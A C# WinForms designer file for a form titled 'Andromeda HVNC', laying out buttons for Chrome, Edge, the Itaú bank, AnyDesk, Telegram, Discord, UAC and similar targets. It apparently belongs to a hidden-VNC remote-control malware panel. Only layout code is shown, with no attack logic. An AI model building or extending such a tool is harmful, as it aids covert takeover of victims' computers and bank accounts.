            this.guna2HtmlLabel18.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel18.Location = new System.Drawing.Point(270, 294);
            this.guna2HtmlLabel18.Name = "guna2HtmlLabel18";
            this.guna2HtmlLabel18.Size = new System.Drawing.Size(26, 15);
            this.guna2HtmlLabel18.TabIndex = 228;
            this.guna2HtmlLabel18.Text = "Task";
            // 
            // guna2PictureBox10
            // 
            this.guna2PictureBox10.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox10.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox10.Image")));
            this.guna2PictureBox10.ImageRotate = 0F;
            this.guna2PictureBox10.Location = new System.Drawing.Point(442, 461);
            this.guna2PictureBox10.Name = "guna2PictureBox10";
            this.guna2PictureBox10.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox10.TabIndex = 186;
            this.guna2PictureBox10.TabStop = false;
            this.guna2PictureBox10.UseTransparentBackground = true;
            this.guna2PictureBox10.Click += new System.EventHandler(this.guna2PictureBox10_Click);
            // 
            // guna2PictureBox33
            // 
            this.guna2PictureBox33.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox33, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox33.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox33.Image")));
            this.guna2PictureBox33.ImageRotate = 0F;
            this.guna2PictureBox33.Location = new System.Drawing.Point(96, 165);
            this.guna2PictureBox33.Name = "guna2PictureBox33";
            this.guna2PictureBox33.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox33.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox33.TabIndex = 234;
            this.guna2PictureBox33.TabStop = false;
            this.guna2PictureBox33.UseTransparentBackground = true;
            this.guna2PictureBox33.Click += new System.EventHandler(this.guna2PictureBox33_Click);
            // 
            // guna2HtmlLabel9
            // 
            this.guna2HtmlLabel9.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel9.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel9.Location = new System.Drawing.Point(442, 502);
            this.guna2HtmlLabel9.Name = "guna2HtmlLabel9";
            this.guna2HtmlLabel9.Size = new System.Drawing.Size(35, 15);
            this.guna2HtmlLabel9.TabIndex = 193;
            this.guna2HtmlLabel9.Text = "E-mail";
            // 
            // guna2PictureBox11
            // 
            this.guna2PictureBox11.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox11.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox11.Image")));
            this.guna2PictureBox11.ImageRotate = 0F;
            this.guna2PictureBox11.Location = new System.Drawing.Point(352, 253);
            this.guna2PictureBox11.Name = "guna2PictureBox11";
            this.guna2PictureBox11.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox11.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox11.TabIndex = 187;
            this.guna2PictureBox11.TabStop = false;
            this.guna2PictureBox11.UseTransparentBackground = true;
            this.guna2PictureBox11.Click += new System.EventHandler(this.guna2PictureBox11_Click);
            // 
            // guna2HtmlLabel32
            // 
            this.guna2HtmlLabel32.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel32, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel32.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel32.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel32.Location = new System.Drawing.Point(28, 204);
            this.guna2HtmlLabel32.Name = "guna2HtmlLabel32";
            this.guna2HtmlLabel32.Size = new System.Drawing.Size(22, 15);
            this.guna2HtmlLabel32.TabIndex = 233;
            this.guna2HtmlLabel32.Text = "Itaú";
            // 
            // guna2PictureBox15
            // 
            this.guna2PictureBox15.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox15.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox15.Image")));
            this.guna2PictureBox15.ImageRotate = 0F;
            this.guna2PictureBox15.Location = new System.Drawing.Point(173, 73);
            this.guna2PictureBox15.Name = "guna2PictureBox15";
            this.guna2PictureBox15.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox15.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox15.TabIndex = 102;
            this.guna2PictureBox15.TabStop = false;
            this.guna2PictureBox15.UseTransparentBackground = true;
            this.guna2PictureBox15.Click += new System.EventHandler(this.guna2PictureBox15_Click);
            // 
            // guna2PictureBox25
            // 
            this.guna2PictureBox25.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox25, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox25.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox25.Image")));
            this.guna2PictureBox25.ImageRotate = 0F;
            this.guna2PictureBox25.Location = new System.Drawing.Point(266, 253);
            this.guna2PictureBox25.Name = "guna2PictureBox25";
            this.guna2PictureBox25.Size = new System.Drawing.Size(40, 40);
            this.guna2PictureBox25.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox25.TabIndex = 227;
            this.guna2PictureBox25.TabStop = false;
            this.guna2PictureBox25.UseTransparentBackground = true;
            this.guna2PictureBox25.Click += new System.EventHandler(this.guna2PictureBox25_Click);
            // 
            // guna2HtmlLabel38
            // 
            this.guna2HtmlLabel38.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel38, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel38.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel38.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel38.Location = new System.Drawing.Point(98, 114);
            this.guna2HtmlLabel38.Name = "guna2HtmlLabel38";
            this.guna2HtmlLabel38.Size = new System.Drawing.Size(29, 15);
            this.guna2HtmlLabel38.TabIndex = 160;
            this.guna2HtmlLabel38.Text = "Edge";
            // 
            // guna2PictureBox32
            // 
            this.guna2PictureBox32.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox32, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox32.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox32.Image")));
            this.guna2PictureBox32.ImageRotate = 0F;
            this.guna2PictureBox32.Location = new System.Drawing.Point(22, 165);
            this.guna2PictureBox32.Name = "guna2PictureBox32";
            this.guna2PictureBox32.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox32.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox32.TabIndex = 232;
            this.guna2PictureBox32.TabStop = false;
            this.guna2PictureBox32.UseTransparentBackground = true;
            this.guna2PictureBox32.Click += new System.EventHandler(this.guna2PictureBox32_Click);
            // 
            // guna2PictureBox14
            // 
            this.guna2PictureBox14.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox14.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox14.Image")));
            this.guna2PictureBox14.ImageRotate = 0F;
            this.guna2PictureBox14.Location = new System.Drawing.Point(96, 73);
            this.guna2PictureBox14.Name = "guna2PictureBox14";
            this.guna2PictureBox14.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox14.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox14.TabIndex = 101;
            this.guna2PictureBox14.TabStop = false;
            this.guna2PictureBox14.UseTransparentBackground = true;
            this.guna2PictureBox14.Click += new System.EventHandler(this.guna2PictureBox14_Click);
            // 
            // guna2HtmlLabel10
            // 
            this.guna2HtmlLabel10.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel10.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel10.Location = new System.Drawing.Point(352, 294);
            this.guna2HtmlLabel10.Name = "guna2HtmlLabel10";
            this.guna2HtmlLabel10.Size = new System.Drawing.Size(37, 15);
            this.guna2HtmlLabel10.TabIndex = 191;
            this.guna2HtmlLabel10.Text = "Config";
            // 
            // guna2HtmlLabel37
            // 
            this.guna2HtmlLabel37.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel37, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel37.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel37.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel37.Location = new System.Drawing.Point(17, 114);
            this.guna2HtmlLabel37.Name = "guna2HtmlLabel37";
            this.guna2HtmlLabel37.Size = new System.Drawing.Size(43, 15);
            this.guna2HtmlLabel37.TabIndex = 159;
            this.guna2HtmlLabel37.Text = "Chrome";
            // 
            // guna2PictureBox2
            // 
            this.guna2PictureBox2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox2.Image")));
            this.guna2PictureBox2.ImageRotate = 0F;
            this.guna2PictureBox2.Location = new System.Drawing.Point(352, 575);
            this.guna2PictureBox2.Name = "guna2PictureBox2";
            this.guna2PictureBox2.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox2.TabIndex = 164;
            this.guna2PictureBox2.TabStop = false;
            this.guna2PictureBox2.UseTransparentBackground = true;
            this.guna2PictureBox2.Click += new System.EventHandler(this.guna2PictureBox2_Click);
            // 
            // guna2HtmlLabel19
            // 
            this.guna2HtmlLabel19.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel19, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel19.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel19.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel19.Location = new System.Drawing.Point(178, 294);
            this.guna2HtmlLabel19.Name = "guna2HtmlLabel19";
            this.guna2HtmlLabel19.Size = new System.Drawing.Size(25, 15);
            this.guna2HtmlLabel19.TabIndex = 230;
            this.guna2HtmlLabel19.Text = "UAC";
            // 
            // guna2PictureBox26
            // 
            this.guna2PictureBox26.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox26, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox26.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox26.Image")));
            this.guna2PictureBox26.ImageRotate = 0F;
            this.guna2PictureBox26.Location = new System.Drawing.Point(173, 253);
            this.guna2PictureBox26.Name = "guna2PictureBox26";
            this.guna2PictureBox26.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox26.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox26.TabIndex = 229;
            this.guna2PictureBox26.TabStop = false;
            this.guna2PictureBox26.UseTransparentBackground = true;
            this.guna2PictureBox26.Click += new System.EventHandler(this.guna2PictureBox26_Click);
            // 
            // guna2HtmlLabel6
            // 
            this.guna2HtmlLabel6.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel6.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel6.Location = new System.Drawing.Point(91, 616);
            this.guna2HtmlLabel6.Name = "guna2HtmlLabel6";
            this.guna2HtmlLabel6.Size = new System.Drawing.Size(49, 15);
            this.guna2HtmlLabel6.TabIndex = 172;
            this.guna2HtmlLabel6.Text = "Supremo";
            // 
            // Guna2PictureBox80
            // 
            this.Guna2PictureBox80.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.Guna2PictureBox80, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox80.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox80.Image")));
            this.Guna2PictureBox80.ImageRotate = 0F;
            this.Guna2PictureBox80.Location = new System.Drawing.Point(22, 73);
            this.Guna2PictureBox80.Name = "Guna2PictureBox80";
            this.Guna2PictureBox80.Size = new System.Drawing.Size(35, 35);
            this.Guna2PictureBox80.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox80.TabIndex = 100;
            this.Guna2PictureBox80.TabStop = false;
            this.Guna2PictureBox80.UseTransparentBackground = true;
            this.Guna2PictureBox80.Click += new System.EventHandler(this.Guna2PictureBox80_Click);
            // 
            // guna2HtmlLabel4
            // 
            this.guna2HtmlLabel4.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel4.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel4.Location = new System.Drawing.Point(438, 206);
            this.guna2HtmlLabel4.Name = "guna2HtmlLabel4";
            this.guna2HtmlLabel4.Size = new System.Drawing.Size(47, 15);
            this.guna2HtmlLabel4.TabIndex = 173;
            this.guna2HtmlLabel4.Text = "AnyDesk";
            // 
            // guna2HtmlLabel2
            // 
            this.guna2HtmlLabel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel2.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel2.Location = new System.Drawing.Point(346, 616);
            this.guna2HtmlLabel2.Name = "guna2HtmlLabel2";
            this.guna2HtmlLabel2.Size = new System.Drawing.Size(51, 15);
            this.guna2HtmlLabel2.TabIndex = 169;
            this.guna2HtmlLabel2.Text = "Telegram";
            // 
            // guna2PictureBox7
            // 
            this.guna2PictureBox7.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox7.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox7.Image")));
            this.guna2PictureBox7.ImageRotate = 0F;
            this.guna2PictureBox7.Location = new System.Drawing.Point(96, 575);
            this.guna2PictureBox7.Name = "guna2PictureBox7";
            this.guna2PictureBox7.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox7.TabIndex = 168;
            this.guna2PictureBox7.TabStop = false;
            this.guna2PictureBox7.UseTransparentBackground = true;
            this.guna2PictureBox7.Click += new System.EventHandler(this.guna2PictureBox7_Click);
            // 
            // guna2PictureBox3
            // 
            this.guna2PictureBox3.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox3.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox3.Image")));
            this.guna2PictureBox3.ImageRotate = 0F;
            this.guna2PictureBox3.Location = new System.Drawing.Point(442, 253);
            this.guna2PictureBox3.Name = "guna2PictureBox3";
            this.guna2PictureBox3.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox3.TabIndex = 165;
            this.guna2PictureBox3.TabStop = false;
            this.guna2PictureBox3.UseTransparentBackground = true;
            this.guna2PictureBox3.Click += new System.EventHandler(this.guna2PictureBox3_Click);
            // 
            // guna2PictureBox4
            // 
            this.guna2PictureBox4.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox4.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox4.Image")));
            this.guna2PictureBox4.ImageRotate = 0F;
            this.guna2PictureBox4.Location = new System.Drawing.Point(442, 165);
            this.guna2PictureBox4.Name = "guna2PictureBox4";
            this.guna2PictureBox4.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox4.TabIndex = 166;
            this.guna2PictureBox4.TabStop = false;
            this.guna2PictureBox4.UseTransparentBackground = true;
            this.guna2PictureBox4.Click += new System.EventHandler(this.guna2PictureBox4_Click);
            // 
            // guna2HtmlLabel3
            // 
            this.guna2HtmlLabel3.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel3.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel3.Location = new System.Drawing.Point(440, 294);
            this.guna2HtmlLabel3.Name = "guna2HtmlLabel3";
            this.guna2HtmlLabel3.Size = new System.Drawing.Size(42, 15);
            this.guna2HtmlLabel3.TabIndex = 170;
            this.guna2HtmlLabel3.Text = "Discord";
            // 
            // guna2PictureBox6
            // 
            this.guna2PictureBox6.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox6.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox6.Image")));
            this.guna2PictureBox6.ImageRotate = 0F;
            this.guna2PictureBox6.Location = new System.Drawing.Point(22, 575);
            this.guna2PictureBox6.Name = "guna2PictureBox6";
            this.guna2PictureBox6.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox6.TabIndex = 167;
            this.guna2PictureBox6.TabStop = false;
            this.guna2PictureBox6.UseTransparentBackground = true;
            this.guna2PictureBox6.Click += new System.EventHandler(this.guna2PictureBox6_Click);
            // 
            // guna2HtmlLabel5
            // 
            this.guna2HtmlLabel5.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2HtmlLabel5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel5.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel5.Location = new System.Drawing.Point(22, 616);
            this.guna2HtmlLabel5.Name = "guna2HtmlLabel5";
            this.guna2HtmlLabel5.Size = new System.Drawing.Size(37, 15);
            this.guna2HtmlLabel5.TabIndex = 171;
            this.guna2HtmlLabel5.Text = "Viewer";
            // 
            // guna2PictureBox1
            // 
            this.guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox1.BorderRadius = 25;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2PictureBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.guna2PictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox1.Image")));
            this.guna2PictureBox1.ImageRotate = 0F;
            this.guna2PictureBox1.Location = new System.Drawing.Point(0, 0);
            this.guna2PictureBox1.Name = "guna2PictureBox1";
            this.guna2PictureBox1.Size = new System.Drawing.Size(1486, 788);
            this.guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox1.TabIndex = 0;
            this.guna2PictureBox1.TabStop = false;
            this.guna2PictureBox1.UseTransparentBackground = true;
            // 
            // guna2Transition1
            // 
            this.guna2Transition1.AnimationType = Guna.UI2.AnimatorNS.AnimationType.HorizSlide;
            this.guna2Transition1.Cursor = null;
            animation2.AnimateOnlyDifferences = true;
            animation2.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.BlindCoeff")));
            animation2.LeafCoeff = 0F;
            animation2.MaxTime = 1F;
            animation2.MinTime = 0F;
            animation2.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.MosaicCoeff")));
            animation2.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation2.MosaicShift")));
            animation2.MosaicSize = 0;
            animation2.Padding = new System.Windows.Forms.Padding(0, 0, 0, 0);
            animation2.RotateCoeff = 0F;
            animation2.RotateLimit = 0F;
            animation2.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.ScaleCoeff")));
            animation2.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.SlideCoeff")));
            animation2.TimeCoeff = 0F;
            animation2.TransparencyCoeff = 0F;
            this.guna2Transition1.DefaultAnimation = animation2;
            // 
            // guna2PictureBox23
            // 
            this.guna2PictureBox23.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.guna2PictureBox23, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox23.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox23.Image")));
            this.guna2PictureBox23.ImageRotate = 0F;
            this.guna2PictureBox23.Location = new System.Drawing.Point(537, 335);
            this.guna2PictureBox23.Name = "guna2PictureBox23";
            this.guna2PictureBox23.Size = new System.Drawing.Size(35, 35);
            this.guna2PictureBox23.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox23.TabIndex = 242;
            this.guna2PictureBox23.TabStop = false;
            this.guna2PictureBox23.UseTransparentBackground = true;
            // 
            // FrmVNC
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.ClientSize = new System.Drawing.Size(1486, 835);
            this.Controls.Add(this.Painel);
            this.Controls.Add(this.PainelDrag);
            this.Controls.Add(this.toolStripStatusLabel3);
            this.Controls.Add(this.siticoneGradientPanel4);
            this.Controls.Add(this.siticoneGradientPanel1);
            this.guna2Transition1.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            this.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MinimizeBox = false;
            this.Name = "FrmVNC";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Andromeda HVNC";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.VNCForm_FormClosing);
            this.Load += new System.EventHandler(this.VNCForm_Load);
            this.Click += new System.EventHandler(this.VNCForm_Click);
            this.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.VNCForm_KeyPress);
            ((System.ComponentModel.ISupportInitialize)(this.statusled)).EndInit();
            this.siticoneGradientPanel4.ResumeLayout(false);
            this.siticoneGradientPanel4.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.VNCBox)).EndInit();
            this.guna2ContextMenuStrip1.ResumeLayout(false);
            this.contextMenuStrip1.ResumeLayout(false);
            this.PainelDrag.ResumeLayout(false);
            this.PainelDrag.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2CirclePictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2CirclePictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox22)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox19)).EndInit();
            this.Painel.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.Icon_Application)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Icon_Home)).EndInit();
            this.guna2Panel1.ResumeLayout(false);
            this.Painel_1.ResumeLayout(false);
            this.Painel_1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox44)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox37)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox41)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox36)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox29)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox45)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox24)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox12)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox30)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox42)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox28)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox27)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox21)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox18)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox17)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox13)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox20)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox31)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox8)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox38)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox35)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox16)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox9)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox43)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox34)).EndInit();
